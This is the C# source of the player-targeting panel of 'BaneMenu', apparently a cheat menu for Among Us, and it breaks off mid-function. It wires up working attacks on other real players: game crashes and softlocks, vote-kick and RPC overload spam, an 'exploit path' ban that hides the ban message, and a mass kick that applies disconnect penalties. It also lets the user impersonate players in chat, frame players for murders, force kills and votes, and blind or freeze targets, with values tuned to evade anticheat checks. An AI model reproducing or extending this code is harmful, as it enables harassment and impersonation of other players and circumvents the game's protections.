using AmongUs.Data;
using AmongUs.InnerNet.GameDataMessages;
using AmongUs.GameOptions;
using BepInEx.Unity.IL2CPP.Utils.Collections;
using BaneMenu.assets;
using BaneMenu.modules;
using BaneMenu.network;
using InnerNet;
using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;

namespace BaneMenu.ui.sections
{
	internal class PlayersSection : Section
	{
		public PlayersSection() : base("Players") { }

		static int voteKickOverloadCount = 500;
		static string hostAuthName = "";
		static string hostAuthChat = "";

		public static Vector2 PlayerPaneSize
		{
			get { return new Vector2(100 * MainUI.scale, MainUI.WindowSize.y - MainUI.HeaderSize.y); }
		}

		public static Vector2 PlayerPanePosition
		{
			get { return new Vector2(MainUI.SectionListPosition.x + MainUI.SectionListSize.x, MainUI.HeaderSize.y + MainUI.HeaderPosition.y); }
		}

		public static Vector2 PlayerButtonSize
		{
			get { return new Vector2(PlayerPaneSize.x, 30 * MainUI.scale); }
		}

		public static Vector2 PlayerOptionsSize
		{
			get { return new Vector2(MainUI.WindowSize.x - MainUI.SectionListSize.x - PlayerPaneSize.x, MainUI.WindowSize.y - MainUI.HeaderSize.y); }
		}

		public static Vector2 PlayerOptionsPosition
		{
			get { return new Vector2(PlayerPanePosition.x + PlayerPaneSize.x, MainUI.HeaderPosition.y + MainUI.HeaderSize.y); }
		}

		public static Vector2 PlayerColorBoxSize
		{
			get { return new Vector2(5 * MainUI.scale, PlayerButtonSize.y); }
		}

		public static PlayerControl selectedPlayer;
		private Vector2 subsectionScrollVector;
		private Vector2 playerListScroll;

		private Controls.PlayerColors selectedColor = Controls.PlayerColors.Red;
		private int selectedVent = 0;

		// Host-auth (no AC) coordinate teleport
		private float tpX = 0f;
		private float tpY = 0f;

		// Host-only: kick everyone but target, then TempBanAll (disconnect penalties)
		private PlayerControl banConfirmTarget;

		public override void HandleSubsectionMove(int offset)
		{
			if(PlayerControl.AllPlayerControls.Count == 0) return;

			int currentPlayer = PlayerControl.AllPlayerControls.IndexOf(selectedPlayer);
			int newPosition = Math.Clamp(currentPlayer + offset, 0, PlayerControl.AllPlayerControls.Count - 1);

			selectedPlayer = PlayerControl.AllPlayerControls[newPosition];
		}

		public override void Render()
		{
			if(PlayerControl.AllPlayerControls.Count == 0)
			{
				GUILayout.Label("There are currently no online players.");
				return;
			}

			GUI.Box(new Rect(0, 0, PlayerPaneSize.x, PlayerPaneSize.y), "", Styles.MainBox);

			// Build visible list first so scroll content height is accurate
			var visible = new System.Collections.Generic.List<PlayerControl>();
			for(int i = 0; i < PlayerControl.AllPlayerControls.Count; i++)
			{
				PlayerControl player = PlayerControl.AllPlayerControls[i];
				if(player == null || player.gameObject == null) continue;
				visible.Add(player);
			}

			float rowH = PlayerButtonSize.y;
			float contentH = Mathf.Max(PlayerPaneSize.y, visible.Count * rowH);
			// Leave room for scrollbar
			float viewW = PlayerPaneSize.x;
			float contentW = Mathf.Max(0f, viewW - 16f * MainUI.scale);
			playerListScroll = GUI.BeginScrollView(
				new Rect(0, 0, viewW, PlayerPaneSize.y),
				playerListScroll,
				new Rect(0, 0, contentW, contentH));

			for(int i = 0; i < visible.Count; i++)
			{
				RenderPlayerSelection(i, visible[i]);
			}

			GUI.EndScrollView();

			if(selectedPlayer != null && selectedPlayer.gameObject != null)
			{
				GUILayout.BeginArea(new Rect(PlayerPaneSize.x, 0, PlayerOptionsSize.x, PlayerOptionsSize.y));
				subsectionScrollVector = GUILayout.BeginScrollView(subsectionScrollVector);

				RenderPlayerControls(selectedPlayer);

				GUILayout.EndScrollView();
				GUILayout.EndArea();
			}
		}

		private void RenderPlayerSelection(int position, PlayerControl player)
		{
			Rect playerInfo = new Rect(0, position * PlayerButtonSize.y, PlayerButtonSize.x, PlayerButtonSize.y);

			string playerName = player.Data != null ? player.Data.PlayerName : (player.name ?? "???");
			if(Whitelist.IsWhitelisted(player)) playerName = "[WL] " + playerName;

			// Mark clones / dummies (no real client attached)
			bool isClone = false;
			try { isClone = AmongUsClient.Instance != null && AmongUsClient.Instance.GetClientFromCharacter(player) == null; } catch { }
			if (isClone)
				playerName = "[Clone] " + playerName;

			// Hydralum presence + mod-menu RPC tags
			try
			{
				if (BaneMenu.modules.misc.HydralumPresence.IsHydralumUser(player))
					playerName = "<color=#9b59b6>[HYDRA]</color> " + playerName;
				if (player.Data != null && BaneMenu.anticheat.ModMenuCheck.TryGet(player.PlayerId, out string modLabel) && !string.IsNullOrEmpty(modLabel))
					playerName = $"<color=#e74c3c>[{modLabel}]</color> " + playerName;
			}
			catch { }

			string roleStr = (player.Data != null) ? player.Data.RoleType.ToString() : "?";
			playerName += $"\n<color=\"{GetRoleColor(player.Data != null ? player.Data.RoleType : RoleTypes.Crewmate)}\">{roleStr}</color>";

			GUIStyle style = player == selectedPlayer ? Styles.PlayerBoxActive : Styles.PlayerBox;

			if(player.OwnerId == AmongUsClient.Instance.HostId)
			{
				style.normal.textColor = new Color(1.0f, 0.84f, 0.0f); // #FFD700
			}
			else if (isClone)
			{
				style.normal.textColor = new Color(0.6f, 0.8f, 1.0f); // light blue for clones
			}

			if(GUI.Button(playerInfo, playerName, style))
			{
				selectedPlayer = player;
			}

			Rect playerColor = new Rect(0, position * PlayerButtonSize.y, PlayerColorBoxSize.x, PlayerColorBoxSize.y);
			if (player.Data != null)
				Controls.DrawCrewmateColorBox(playerColor, player.Data);
		}

		private string GetRoleColor(RoleTypes role)
		{
			return RoleManager.IsImpostorRole(role) ? "red" : "#8afcfc";
		}

		private void RenderPlayerControls(PlayerControl target)
		{
			if(target == null)
			{
				GUILayout.Label("Specified target is not valid.");
				return;
			}

			try
			{
				RenderPlayerControlsInner(target);
			}
			catch (System.Exception e)
			{
				Bane.Log.LogError($"PlayersSection render error: {e}");
				GUILayout.Label("Player controls error - see BepInEx log.");
			}
		}

		private void RenderPlayerControlsInner(PlayerControl target)
		{
			bool hasAnticheat = Utilities.IsAnticheatPresent();

			// If we want to get a player's name, we have to use NetworkedPlayerInfo::PlayerName instead of PlayerControl::name to avoid
			// getting the incorrect name if the player is shapeshifted to another player
			bool isClone = false;
			try { isClone = AmongUsClient.Instance.GetClientFromCharacter(target) == null; } catch { }

			string playerInfo =
				$"Name: {(target.Data != null ? target.Data.PlayerName : target.name)} ({(target.Data != null ? Utilities.GetPlayerColor(target.Data) : "?")})" +
				$"\nRole: {(target.Data != null ? target.Data.RoleType.ToString() : "?")}" +
				$"\nState: " + (target.Data != null && target.Data.IsDead ? "Dead" : "Alive") +
				(isClone ? "\nType: Clone / Dummy" : "\nType: Real Player");

			ClientData clientData = AmongUsClient.Instance.GetClientFromCharacter(target);
			if(clientData != null && target.Data != null)
			{
				PlatformSpecificData platform = clientData.PlatformData;

				bool streamerMode = DataManager.Settings.Gameplay.StreamerMode;

				playerInfo +=
					$"\nFriendcode: " + (streamerMode ? "REDACTED" : target.Data.FriendCode) +
					$"\nPUID: " + (streamerMode ? "REDACTED" : target.Data.Puid) +
					$"\nLevel: {target.Data.PlayerLevel + 1}" +
					"\nDevice: " + ((int)platform.Platform == 112 ? "Starlight" : platform.Platform.ToString()) + $" ({(int)platform.Platform})" +
					(target.OwnerId == AmongUsClient.Instance.HostId ? "\nHost: true" : "");
			}

			GUILayout.Label(playerInfo);

			if(target != PlayerControl.LocalPlayer)
			{
				if(!Whitelist.CanWhitelist(target))
				{
					GUILayout.Label("Whitelist unavailable (player has no PUID).");
				}
				else
				{
					bool whitelisted = Whitelist.IsWhitelisted(target);
					if(Controls.Toggle(whitelisted, "Whitelist (skip in all-player actions)") != whitelisted)
					{
						if(whitelisted) Whitelist.Remove(target);
						else Whitelist.Add(target);
					}
				}
			}

			if (target != PlayerControl.LocalPlayer)
			{
				bool wasImmortal = BaneMenu.modules.self.Immortality.IsImmortal(target.PlayerId);
				bool nowImmortal = Controls.Toggle(wasImmortal, "Make Immortal");
				if (nowImmortal != wasImmortal)
					BaneMenu.modules.self.Immortality.SetImmortal(target, nowImmortal);
			}

			// Host-auth only: chat / name as this player
			if (!Utilities.IsAnticheatPresent())
			{
				GUILayout.Space(6);
				GUILayout.Label("Host-auth: act as this player");
				bool commitName;
				hostAuthName = Controls.TextBox("Name", hostAuthName, "hostauth_name_" + target.PlayerId, out commitName, 24);
				if (Controls.Button("Set their name"))
				{
					try
					{
						string n = string.IsNullOrEmpty(hostAuthName) ? "???" : hostAuthName;
						var batch = new BatchedMessage();
						batch.QueueSetName(target, n);
						batch.FinishBatch();
						Bane.notifications.Send("Host-auth", $"{(target.Data != null ? target.Data.PlayerName : target.name)} → {n}", 3);
					}
					catch (System.Exception e)
					{
						Bane.notifications.Send("Host-auth", e.Message, 4);
					}
				}

				bool commitChat;
				hostAuthChat = Controls.TextBox("Chat message", hostAuthChat, "hostauth_chat_" + target.PlayerId, out commitChat, 80);
				if (Controls.Button("Send chat as them"))
				{
					try
					{
						string msg = string.IsNullOrEmpty(hostAuthChat) ? " " : hostAuthChat;
						SendChatAsServerSided(target, msg);
						Bane.notifications.Send("Host-auth", "Chat sent as them (server-sided)", 3);
					}
					catch (System.Exception e)
					{
						Bane.notifications.Send("Host-auth", e.Message, 4);
					}
				}
			}

			GUILayout.Space(4);
			ModuleManager.spectatePlayer.Enabled = Controls.PlayerSpecificToggle("Spectate", target, ref ModuleManager.spectatePlayer.target);
			Bane.routines.petPlayer.Enabled = Controls.PlayerSpecificToggle("Pet Player", target, ref Bane.routines.petPlayer.target);
			Bane.routines.playerFollower.Enabled = Controls.PlayerSpecificToggle("Follow", target, ref Bane.routines.playerFollower.target);
			Bane.routines.jailPlayer.Enabled = Controls.PlayerSpecificToggle("Place in Jail", target, Bane.routines.jailPlayer.targets);
			Bane.routines.teleportSpammer.Enabled = Controls.PlayerSpecificToggle("Spam Teleports", target, Bane.routines.teleportSpammer.targets);
			Controls.PlayerSpecificToggle("Give Kick on Touch", target, Bane.routines.kickOnTouch.sources);
				Bane.routines.ziplineSpammer.Enabled = Controls.PlayerSpecificToggle("Spam Zipline", target, Bane.routines.ziplineSpammer.targets);
			Bane.routines.kickOnTouch.NotifySourcesChanged();
			ModuleManager.whisper.Enabled = Controls.PlayerSpecificToggle("Whisper", target, ref ModuleManager.whisper.target);

			GUILayout.BeginHorizontal();
			if(Controls.Button("Teleport"))
			{
				// We do not want to use PlayerControl::GetTruePosition() here as it would teleport us to the player's feet
				Teleporter.TeleportTo(target.transform.position);
			}

			if(!hasAnticheat && Controls.Button("Teleport to Me"))
			{
				Teleporter.TeleportPlayerTo(target, PlayerControl.LocalPlayer.transform.position);
			}
			GUILayout.EndHorizontal();

			if(!hasAnticheat && Controls.Button("Teleport All To"))
			{
				Teleporter.TeleportAllTo(target.transform.position);
			}

			// Host-auth (no AC) extras - keep UI simple so the rest of the tab still renders
			if(!hasAnticheat)
			{
				GUILayout.Space(5);
				GUILayout.Label("No-AC Teleport Coords:");
				GUILayout.Label(string.Format("X: {0:F1}", tpX));
				tpX = Controls.HorizontalSlider(tpX, -60f, 60f);
				GUILayout.Label(string.Format("Y: {0:F1}", tpY));
				tpY = Controls.HorizontalSlider(tpY, -60f, 60f);

				if(Controls.Button("TP Player to Coords"))
				{
					Teleporter.TeleportPlayerTo(target, new Vector2(tpX, tpY));
				}
				if(Controls.Button("TP All to Coords"))
				{
					Teleporter.TeleportAllTo(new Vector2(tpX, tpY));
				}
				if(Controls.Button("TP Me to Coords"))
				{
					Teleporter.TeleportTo(new Vector2(tpX, tpY));
				}

				GUILayout.BeginHorizontal();
				if(Controls.Button("Set Coords = Me"))
				{
					if(PlayerControl.LocalPlayer != null)
					{
						Vector3 pos = PlayerControl.LocalPlayer.transform.position;
						tpX = pos.x;
						tpY = pos.y;
					}
				}
				if(Controls.Button("Set Coords = Them"))
				{
					Vector3 pos = target.transform.position;
					tpX = pos.x;
					tpY = pos.y;
				}
				GUILayout.EndHorizontal();

				GUILayout.Space(3);
				GUILayout.Label("No-AC Extras:");

				if(Controls.Button("Swap Positions With Me"))
				{
					if(PlayerControl.LocalPlayer != null)
					{
						Vector2 a = PlayerControl.LocalPlayer.transform.position;
						Vector2 b = target.transform.position;
						Teleporter.TeleportPlayerTo(PlayerControl.LocalPlayer, b);
						Teleporter.TeleportPlayerTo(target, a);
					}
				}

				if(Controls.Button("Shuffle All Positions"))
				{
					System.Random rng = new System.Random();
					List<Vector2> positions = new List<Vector2>();
					List<PlayerControl> players = new List<PlayerControl>();
					foreach(PlayerControl p in PlayerControl.AllPlayerControls)
					{
						if(p == null || p.Data == null || p.Data.Disconnected) continue;
						if(Whitelist.ShouldSkip(p)) continue;
						players.Add(p);
						positions.Add((Vector2)p.transform.position);
					}
					for(int i = positions.Count - 1; i > 0; i--)
					{
						int j = rng.Next(i + 1);
						Vector2 tmp = positions[i];
						positions[i] = positions[j];
						positions[j] = tmp;
					}
					for(int i = 0; i < players.Count; i++)
						Teleporter.TeleportPlayerTo(players[i], positions[i]);
				}

				if(Controls.Button("Set Role Impostor"))
				{
					BatchedMessage batch = new BatchedMessage();
					batch.QueueSetRole(target, RoleTypes.Impostor, true);
					batch.FinishBatch();
				}
				if(Controls.Button("Set Role Crewmate"))
				{
					BatchedMessage batch = new BatchedMessage();
					batch.QueueSetRole(target, RoleTypes.Crewmate, true);
					batch.FinishBatch();
				}

				if(Controls.Button("Murder Random As Them"))
				{
					PlayerControl victim = Utilities.GetRandomPlayer(false, true, false, true);
					if(victim != null && victim != target)
						target.RpcMurderPlayer(victim, true);
				}
				if(Controls.Button("Kill All As Them"))
				{
					foreach(PlayerControl p in PlayerControl.AllPlayerControls)
					{
						if(p == null || p == target || p.Data == null) continue;
						if(p.Data.IsDead || p.Data.Disconnected) continue;
						if(Whitelist.ShouldSkip(p)) continue;
						target.RpcMurderPlayer(p, true);
					}
				}
			}

			if(Controls.Button("Murder"))
			{
				AttemptMurder(target);
			}

			if(Controls.Button("Copy Avatar"))
			{
				Utilities.CopyPlayer(target);
			}

			// ---- AuraMenu PlayersTab host actions (ported from Aura HostCheats / PlayerActions) ----
			if (Utilities.IsHostEffective())
			{
				if (Controls.Button("Clone Player"))
				{
					// EXACT Aura PlayersTab Spawn Dummy (this path is what actually clones on the network):
					// Instantiate → PlayerId = target → AmongUsClient.Instance.Spawn(pc)
					var d = BaneMenu.modules.host.HostDummies.SpawnDummyAtPlayer(target);
					if (d != null)
						Bane.notifications.Send("Clone", "Cloned player", 3);
					else
						Bane.notifications.Send("Clone", "Failed to clone", 3);
				}

				if (AmongUsClient.Instance.GetClientFromCharacter(target) == null)
				{
					if (Controls.Button("Despawn Dummy"))
					{
						BaneMenu.modules.host.HostDummies.DespawnDummy(target);
						Bane.notifications.Send("Dummy", "Despawned dummy", 3);
					}
				}

				if (Controls.Button("Kick From Meeting"))
				{
					BaneMenu.modules.host.HostDummies.KickMeeting(target);
					Bane.notifications.Send("Meeting", $"Kicked {target.Data?.PlayerName} from meeting", 3);
				}

				bool isChaseTarget = BaneMenu.modules.host.HostDummies.chasedPlayerId == target.PlayerId
					&& (BaneMenu.modules.host.HostDummies.controlAll || BaneMenu.modules.host.HostDummies.controlDummies);
				if (Controls.Toggle(isChaseTarget, "Move All Players To"))
				{
					if (isChaseTarget)
					{
						BaneMenu.modules.host.HostDummies.chasedPlayerId = 255;
						BaneMenu.modules.host.HostDummies.controlAll = false;
						BaneMenu.modules.host.HostDummies.controlDummies = false;
					}
					else
					{
						BaneMenu.modules.host.HostDummies.chasedPlayerId = target.PlayerId;
						if (!BaneMenu.modules.host.HostDummies.controlAll && !BaneMenu.modules.host.HostDummies.controlDummies)
							BaneMenu.modules.host.HostDummies.controlAll = true;
					}
				}
			}

			if(Controls.Button("Report Body"))
			{
				Utilities.AttemptStartMeeting(PlayerControl.LocalPlayer, target.Data);
			}

			// Exploit path: no public "[x] was banned by [host]" even if you are host
			if(Controls.Button("Attempt to Ban"))
			{
				Utilities.AttemptBan(target);
			}

			if(Controls.Button("Votekick"))
			{
				if(target == null || VoteBanSystem.Instance == null || PlayerControl.LocalPlayer == null)
				{
					Bane.notifications.Send("Votekick", "Missing state.", 3);
				}
				else
				{
					try
					{
						VoteBanSystem.Instance.CmdAddVote(target.OwnerId);
						Bane.notifications.Send("Votekick", $"Voted to kick {target.Data?.PlayerName ?? "?"}", 3);
					}
					catch(System.Exception e)
					{
						Bane.notifications.Send("Votekick", e.Message, 4);
					}
				}
			}

			if(Controls.Button("VoteKick spam x5 (self)"))
			{
				VoteKickSpam(target, false);
			}
			if(Controls.Button("VoteKick spam x5 (batch)"))
			{
				VoteKickSpam(target, true);
			}
			if(Controls.Button("VoteKick as all clients x1"))
			{
				VoteKickAsEveryone(target);
			}
			GUILayout.Label("VoteKick overload count: " + voteKickOverloadCount);
			voteKickOverloadCount = (int)UnityEngine.Mathf.Round(Controls.HorizontalSlider(voteKickOverloadCount, 50, 5000));
			if(Controls.Button("VoteKick OVERLOAD batch (self xN)"))
			{
				VoteKickOverloadBatch(target, voteKickOverloadCount);
			}
			if(Controls.Button("RPC mix overload x3 (GameDataTo them)"))
			{
				SafeRpcMixOverloadTo(target);
			}

			// Vanilla host ban (public message to lobby)
			if (AmongUsClient.Instance != null && Utilities.IsHostEffective())
			{
				if (Controls.Button("Ban"))
				{
					Utilities.HostBanPlayer(target);
				}
			}

			SortedDictionary<int, string> vents = MapAssets.GetVents();

			GUILayout.Label($"Teleport player to vent: {vents.GetValueOrDefault(selectedVent, "N/A")}");
			selectedVent = Controls.HorizontalVentSlider(vents, selectedVent);
			if(Controls.Button("Teleport"))
			{
				Teleporter.TeleportToVent(target, selectedVent);
			}

			if (Utilities.IsHostEffective())
			{
			GUILayout.Space(5);
			GUILayout.Label("Host Only Features:");

			Bane.routines.playerOrbitSpam.Enabled = Controls.PlayerSpecificToggle(
				"Player Orbit Spam", target, Bane.routines.playerOrbitSpam.targets);

			if (Controls.Button("Crash Game (lobby-only)"))
			{
				CrashTargetWithMeetingHub(target, lobbyOnly: true);
			}
			if (Controls.Button("Softlock (mid game only)"))
			{
				CrashTargetWithMeetingHub(target, lobbyOnly: false);
			}
			if (Controls.Button("Test Ban"))
			{
				TestBanMeetingOnlyThem(target);
			}
			GUILayout.BeginHorizontal();
			if (Controls.Button("Despawn Player"))
			{
				DespawnTargetPlayer(target, hollowInfo: false, despawnBody: true);
			}
			if (Controls.Button("Hollow Player"))
			{
				DespawnTargetPlayer(target, hollowInfo: true, despawnBody: false);
			}
			if (Controls.Button("Purge Player"))
			{
				DespawnTargetPlayer(target, hollowInfo: true, despawnBody: true);
			}
			GUILayout.EndHorizontal();

			// --- Ban (kick others + TempBanAll) ---
			if (banConfirmTarget != null && banConfirmTarget == target)
			{
				GUILayout.Label("WARNING: This will KICK every other player in the lobby,");
				GUILayout.Label("then run Temp Ban All on whoever remains.");
				GUILayout.Label("That applies Among Us disconnect penalties (not just a room ban).");
				GUILayout.Label($"Target kept in lobby: {target.Data?.PlayerName ?? "?"}");
				GUILayout.BeginHorizontal();
				if (Controls.Button("Confirm Universal Ban"))
				{
					ExecuteLobbyBan(target);
					banConfirmTarget = null;
				}
				if (Controls.Button("Cancel"))
					banConfirmTarget = null;
				GUILayout.EndHorizontal();
			}
			else if (Controls.Button("Universal Ban"))
			{
				if (!Utilities.IsHostEffective())
					Bane.notifications.Send("Universal Ban", "You must be host to use this.", 4);
				else
					banConfirmTarget = target;
			}

			ModuleManager.autoReportBodies.Enabled = Controls.PlayerSpecificToggle("Auto Report Bodies As", target, ref ModuleManager.autoReportBodies.target);
			Bane.routines.discoHost.Enabled = Controls.PlayerSpecificToggle("Disco Mode", target, Bane.routines.discoHost.targets);
			ModuleManager.voteImmune.Enabled = Controls.PlayerSpecificToggle("Vote Immune", target, ModuleManager.voteImmune.targets);
			Bane.routines.voteSpammer.Enabled = Controls.PlayerSpecificToggle("Spam Votes As", target, Bane.routines.voteSpammer.targets);

			if(Controls.Button("Force Meeting As"))
			{
				Utilities.AttemptStartMeeting(target, null);
			}

			GUILayout.BeginHorizontal();
			if(Controls.Button("Force All Votes To"))
			{
				ForceAllVotesTo(target);
			}

			if(Controls.Button("Eject"))
			{
				EjectPlayer(target);
			}
			GUILayout.EndHorizontal();

			if(Controls.Button("Frame Shapeshift"))
			{
				PlayerControl randomPl = Utilities.GetRandomPlayer(false, false, false, false);
				Utilities.ShapeshiftPlayer(target, randomPl);
			}

			if(Controls.Button("Frame for Killing All"))
			{
				target.StartCoroutine(AttemptFrameForKillingAll(target).WrapToIl2Cpp());
			}

			GUILayout.BeginHorizontal();
			if(Controls.Button("Flood Player with Tasks"))
			{
				if(!Utilities.IsHostEffective())
				{
					Bane.notifications.Send("Assign Tasks", "You must be the host of the lobby.", 3);
				}
				else
				{
					byte[] taskIds = new byte[255];

					for(byte i = 0; i < 255; i++)
					{
						taskIds[i] = i;
					}

					target.Data.RpcSetTasks(taskIds);
				}
			}

			if(Controls.Button("Clear Tasks"))
			{
				if(!Utilities.IsHostEffective())
				{
					Bane.notifications.Send("Assign Tasks", "You must be the host of the lobby.", 3);
				}
				else
				{
					target.Data.RpcSetTasks(Array.Empty<byte>());
				}
			}
			GUILayout.EndHorizontal();

			}

			GUILayout.Space(5);
			GUILayout.Label("Game Options Modifier:");

			GUILayout.BeginHorizontal();
			if(Controls.Button("Blind"))
			{
				IGameOptions gameOptions = GameOptions.CreateCloneOptions(GameManager.Instance.LogicOptions.currentGameOptions);
				gameOptions.SetFloat(FloatOptionNames.CrewLightMod, -1.0f);
				gameOptions.SetFloat(FloatOptionNames.ImpostorLightMod, -1.0f);

				GameOptions.SendGameOptionsToClient(gameOptions, target.OwnerId);
			}

			if(Controls.Button("Fullbright"))
			{
				IGameOptions gameOptions = GameOptions.CreateCloneOptions(GameManager.Instance.LogicOptions.currentGameOptions);
				gameOptions.SetFloat(FloatOptionNames.CrewLightMod, 1000f);
				gameOptions.SetFloat(FloatOptionNames.ImpostorLightMod, 1000f);

				GameOptions.SendGameOptionsToClient(gameOptions, target.OwnerId);
			}
			GUILayout.EndHorizontal();

			GUILayout.BeginHorizontal();
			if(Controls.Button("Slow Speed"))
			{
				IGameOptions gameOptions = GameOptions.CreateCloneOptions(GameManager.Instance.LogicOptions.currentGameOptions);
				gameOptions.SetFloat(FloatOptionNames.PlayerSpeedMod, 0.1f);

				GameOptions.SendGameOptionsToClient(gameOptions, target.OwnerId);
			}

			if(Controls.Button("Freeze"))
			{
				// ~smallest positive normalized float32 (not 0 - AC may flag exact 0 on per-client options)
				const float freezeSpeed = 1.17549435e-38f;
				IGameOptions gameOptions = GameOptions.CreateCloneOptions(GameManager.Instance.LogicOptions.currentGameOptions);
				gameOptions.SetFloat(FloatOptionNames.PlayerSpeedMod, freezeSpeed);

				GameOptions.SendGameOptionsToClient(gameOptions, target.OwnerId);
			}

			if (Utilities.IsHostEffective())
			{
				bool killOff = ModuleManager.disableKillButton.IsDisabled(target.PlayerId)
					&& ModuleManager.disableKillButton.Targets.Contains(target.PlayerId);
				// show on if in targets OR (everyone mode and not self-only display)
				bool shown = ModuleManager.disableKillButton.Targets.Contains(target.PlayerId);
				bool next = Controls.Toggle(shown, "Disable Kill Button (NaN cooldown)");
				if (next != shown)
					ModuleManager.disableKillButton.SetPlayer(target, next);
			}

			if(Controls.Button("TP to Origin"))
			{
				target.StartCoroutine(TpToOriginThenRestoreSpeed(target).WrapToIl2Cpp());
			}

			if(Controls.Button("Super Speed"))
			{
				// The vanilla anticheat prevents us from being able to exceed speeds greater than 3.0f
				float maxSpeed = Utilities.IsAnticheatPresent() ? 3.0f : 5.0f;

				IGameOptions gameOptions = GameOptions.CreateCloneOptions(GameManager.Instance.LogicOptions.currentGameOptions);
				gameOptions.SetFloat(FloatOptionNames.PlayerSpeedMod, maxSpeed);

				GameOptions.SendGameOptionsToClient(gameOptions, target.OwnerId);
			}
			GUILayout.EndHorizontal();

			/*
			// The problem with changing the TaskBarMode is that if we remove the task bar, we are not able to bring it back
			GUILayout.BeginHorizontal();
			if(Controls.Button("Hide Task Bar"))
			{
				IGameOptions gameOptions = GameOptions.CreateCloneOptions(GameManager.Instance.LogicOptions.currentGameOptions);
				gameOptions.SetInt(Int32OptionNames.TaskBarMode, (int)TaskBarMode.Invisible);

				GameOptions.SendGameOptionsToClient(gameOptions, target.OwnerId);
			}

			if(Controls.Button("Show Task Bar"))
			{
				IGameOptions gameOptions = GameOptions.CreateCloneOptions(GameManager.Instance.LogicOptions.currentGameOptions);
				gameOptions.SetInt(Int32OptionNames.TaskBarMode, (int)TaskBarMode.Normal);

				GameOptions.SendGameOptionsToClient(gameOptions, target.OwnerId);
			}
			GUILayout.EndHorizontal();
			*/

			if(Controls.Button("Reset to Defaults"))
			{
				IGameOptions gameOptions = GameOptions.CreateCloneOptions(GameManager.Instance.LogicOptions.currentGameOptions);
				GameOptions.SendGameOptionsToClient(gameOptions, target.OwnerId);
			}

			GUILayout.Space(5);
			GUILayout.Label($"Change color to: {selectedColor}");
			selectedColor = Controls.HorizontalColorSlider(selectedColor);

			if(Controls.Button("Set Color"))
			{
				target.RpcSetColor((byte)selectedColor);
			}
		}

		private static void AttemptMurder(PlayerControl target)
		{
			bool hasAnticheat = Utilities.IsAnticheatPresent();

			// Host can murder in lobby for testing (no "game started" gate)
			if(Utilities.IsHostEffective())
			{
				Bane.Log.LogInfo($"Attempting to murder {target.Data.PlayerName}, we are the host so we can use the MurderPlayer RPC");
				PlayerControl.LocalPlayer.RpcMurderPlayer(target, true);
				Bane.notifications.Send("Murder Player", $"Killed {target.Data.PlayerName}.", 5);
				return;
			}

			if(!hasAnticheat)
			{
				Bane.Log.LogInfo($"Attempting to murder {target.Data.PlayerName}, we are are in a host-authoritative lobby so we can use the MurderPlayer RPC");
				PlayerControl.LocalPlayer.RpcMurderPlayer(target, true);
				Bane.notifications.Send("Murder Player", $"Killed {target.Data.PlayerName}.", 5);
				return;
			}

			Bane.Log.LogInfo($"Attempting to kill {target.Data.PlayerName}, we are not the host so we have to use the CheckMurder RPC");

			// The CheckMurder RPC handler will not authorize kills if you are not the imposter, or you are inside a meeting
			// There are more checks, but I do not think it is worth adding them all here
			if(!RoleManager.IsImpostorRole(PlayerControl.LocalPlayer.Data.RoleType))
			{
				Bane.notifications.Send("Murder Player", "You can only murder players when you are an Impostor, unless you are the host of the lobby.");
				return;
			}

			if(MeetingHud.Instance != null)
			{
				Bane.notifications.Send("Murder Player", "You can only murder players outside of meetings, unless you are the host of the lobby.");
				return;
			}

			Bane.notifications.Send("Murder Player", $"Attempted to kill {target.Data.PlayerName}.", 5);
			PlayerControl.LocalPlayer.CmdCheckMurder(target);
		}

		private void ForceAllVotesTo(PlayerControl player)
		{
			if(Utilities.IsAnticheatPresent() && !Utilities.IsHostEffective())
			{
				Bane.notifications.Send("Force Votes", "You must be the host of the lobby in order to use this feature.");
				return;
			}

			if(MeetingHud.Instance == null)
			{
				Bane.notifications.Send("Force Votes", "This option can only be used when there is an active meeting.");
				return;
			}

			MeetingHud.VoterState[] array = new MeetingHud.VoterState[PlayerControl.AllPlayerControls.Count];

			for(int i = 0; i < array.Length; i++)
			{
				MeetingHud.VoterState state = array[i];

				state.VoterId = (byte)i;
				state.VotedForId = player.PlayerId;

				array[i] = state;
			}

			BatchedMessage batch = new BatchedMessage();
			batch.QueueVotingComplete(array, player.Data, false, false, 0);
			batch.FinishBatch();
		}

		private void EjectPlayer(PlayerControl player)
		{
			if(Utilities.IsAnticheatPresent() && !Utilities.IsHostEffective())
			{
				Bane.notifications.Send("Eject Player", "You must be the host of the lobby in order to use this feature.");
				return;
			}

			BatchedMessage batch = new BatchedMessage();

			if(MeetingHud.Instance == null)
			{
				MeetingHud.Instance = UnityEngine.Object.Instantiate<MeetingHud>(HudManager.Instance.MeetingPrefab);
				batch.QueueSpawn(MeetingHud.Instance, -2, SpawnFlags.None);
			}

			MeetingHud.VoterState[] votes = Array.Empty<MeetingHud.VoterState>();

			batch.QueueVotingComplete(votes, player.Data, false, false, 0);
			// If we created a MeetingHud object then it will be destroyed by the RpcClose function
			batch.QueueCloseMeeting();
			batch.FinishBatch();
		}


		private static IEnumerator TpToOriginThenRestoreSpeed(PlayerControl target)
		{
			if (target == null || GameManager.Instance == null || GameManager.Instance.LogicOptions == null)
				yield break;

			float previous = 1f;
			try
			{
				previous = GameManager.Instance.LogicOptions.currentGameOptions.GetFloat(FloatOptionNames.PlayerSpeedMod);
				if (float.IsNaN(previous) || float.IsInfinity(previous) || previous <= 0f)
					previous = 1f;
			}
			catch
			{
				previous = 1f;
			}

			IGameOptions nanOpts = GameOptions.CreateCloneOptions(GameManager.Instance.LogicOptions.currentGameOptions);
			nanOpts.SetFloat(FloatOptionNames.PlayerSpeedMod, float.NaN);
			GameOptions.SendGameOptionsToClient(nanOpts, target.OwnerId);

			yield return new WaitForSecondsRealtime(0.15f);

			if (target == null || target.Data == null || target.Data.Disconnected)
				yield break;

			IGameOptions restoreOpts = GameOptions.CreateCloneOptions(GameManager.Instance.LogicOptions.currentGameOptions);
			restoreOpts.SetFloat(FloatOptionNames.PlayerSpeedMod, previous);
			GameOptions.SendGameOptionsToClient(restoreOpts, target.OwnerId);

			Bane.notifications.Send("TP to Origin", $"Sent {target.Data.PlayerName} to origin, speed restored ({previous:F2}).", 4);
		}

		private static IEnumerator AttemptFrameForKillingAll(PlayerControl target)
		{
			Bane.Log.LogInfo($"Attempting to frame {target.Data.PlayerName} for killing all players...");

			bool hasAnticheat = Utilities.IsAnticheatPresent();
			if(hasAnticheat && !Utilities.IsHostEffective())
			{
				Bane.notifications.Send("Framer", "You must be the host of the lobby in order to use this option.");
				yield break;
			}

			if(hasAnticheat && AmongUsClient.Instance.GameState != InnerNetClient.GameStates.Started)
			{
